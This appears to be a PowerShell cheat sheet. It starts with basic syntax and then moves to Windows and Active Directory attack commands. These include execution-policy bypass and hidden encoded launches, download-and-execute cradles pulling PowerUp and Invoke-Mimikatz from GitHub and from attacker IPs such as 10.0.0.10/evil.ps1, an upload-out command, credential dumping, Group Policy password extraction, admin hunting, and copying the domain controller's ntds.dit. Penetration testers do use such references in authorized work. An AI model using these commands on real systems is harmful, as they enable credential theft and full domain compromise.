PowerShell


# File types
script file			    .ps1
script data file		.psd1
script module file	.psm1

# Vocabulary
string - Any combination of letters and numbers that are surrounded by quotes. Used for printing stuff.
integer - A number without quotes. Used for math.
boolean - True or false, represented as $True or $False.
variable - A value that can be assigned over the course of a script.

# Objects
PS C:\> $a = "apple" 
PS C:\> $a.Length
5
PS C:\> $a.ToUpper()
APPLE

# Arrays
PS C:\> $list = "red", "white", "blue"
PS C:\> $list[0]
red
PS C:\> $list[2]
blue

# CMDLETS
Uses a 'verb-noun' format.
Get-Date
Get-Process

# For loops
$list = "one", "two", "three"
forEach ($item in $list){
	write-host = $item
}

$dirs = Get-ChildItem C:\
forEach ($dir in $dirs){
	write-host $dir.FullName
	write-host "-----"
	$acl = $dir.GetAccessControl()
	write-host $acl.AccessToString
	write-host
}

# While loops
$i = 1
while ($i -le 5){
	write-host $i
	$i = $i + 1
}
------------------------------------------------------------------------------------------------------

C:\> powershell.exe -exec bypass        Start PowerShell bypass execution policy.
C:\> powershell.exe -NoP -sta -NonI -W Hidden -Enc <code>

PS C:\> mode 300                        Full screen.
PS C:\> Get-Command                     Show all commands.
PS C:\> Get- <tab>                      Tab through each command.
PS C:\> Get-History                     Show Command history.
PS C:\> Get-Process                     Show current running processes.
------------------------------------------------------------------------------------------------------

# Priv escalation

- Load from disk
PS C:\> Import-Module PowerUp.ps1
PS C:\> Invoke-AllChecks

- Load from GitHub
PS C:\> "IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/1PdjSHk');Invoke-PowerUp"
PS C:\> Invoke-AllChecks

- Load from Kali
cd /opt/Empire/data/module_source/privesc/
python -m SimpleHTTPServer

- Windows
PS C:\> "IEX (New-Object Net.WebClient).DownloadString('http://172.16.16.214:8000/PowerUp.ps1');Invoke-PowerUp"
PS C:\> Invoke-AllChecks
------------------------------------------------------------------------------------------------------

# Dump creds

- Load from GitHub
PS C:\> "IEX (New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz"

- Load from Kali
cd /opt/Empire/data/module_source/credentials/
python -m SimpleHTTPServer

- Windows
PS C:\> "IEX (New-Object Net.WebClient).DownloadString('http://172.16.16.214:8000/Invoke-Mimikatz.ps1');Invoke-Mimikatz"
------------------------------------------------------------------------------------------------------

# Open fileshares

PS C:\> Import-Module powerview.ps1
PS C:\> Invoke-ShareFinder -CheckShareAccess

PS C:\> New-PSDrive S -PSProvider FileSystem -Root \\10.0.0.14\SYSVOL
PS C:\> PSDrive
PS C:\> Remove-PSDrive S
------------------------------------------------------------------------------------------------------

# Download file
IEX(New-Object System.Net.Webclient).DownloadString(‘http://10.0.0.10/evil.ps1’)

# Download file to disk
IEX(New-Object System.Net.Webclient).DownloadFile(‘http://10.1.1.100/evil.exe’, ‘good.exe’)

# Upload file
IEX(New-Object System.Net.Webclient).UploadString(‘http://10.0.0.10/evil.ps1’,”<PostDATA>”)
------------------------------------------------------------------------------------------------------

# Who are your admins

PS C:\> Import-Module powerview.ps1
PS C:\> Get-NetGroups *admin* | Get-NetGroup -Recurse
------------------------------------------------------------------------------------------------------

# Where are your admins

PS C:\> Import-Module powerview.ps1
PS C:\> Invoke-UserHunter -ShowAll
------------------------------------------------------------------------------------------------------

# Old user passwords

PS C:\> Import-Module powerview.ps1
PS C:\> Get-NetUser | ? {$_.whenchanged -lt (Get-Date).AddMonths(-12)} | % {$_.samaccountname}
------------------------------------------------------------------------------------------------------

# Who can admin your DC?

PS C:\> Import-Module powerview.ps1
PS C:\> Get-NetDomainControllers | Get-NetLocalGroup
------------------------------------------------------------------------------------------------------

# Extract passwords from Group Policy

PS C:\> Import-Module PowerSploit.ps1
PS C:\> Get-GPPPassword

\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\
Search xml files for cpassword.
PS C:\> GetDecryptedCpassword 'AES 256-bit encrypted password'
------------------------------------------------------------------------------------------------------

# Dump the DC database

PS C:\> Import-Module PowerView
PS C:\> Invoke-UserHunter
PS C:\> import-Module PowerSploit
PS C:\> Invoke-Mimikatz -ComputerName <name>

Open a new PS window as Administrator.
Use the creds you just found.

PS C:\> Import-Module PowerView
PS C:\> Get-NetDomainController
PS C:\> Import-Module PowerSploit
PS C:\> Invoke-NinjaCopy -Path C:\windows\ntds\ntds.dit -LocalDistination C:\ntds.dit -ComputerName <DC name>
PS C:\> ls
------------------------------------------------------------------------------------------------------

# MS16-032
https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1
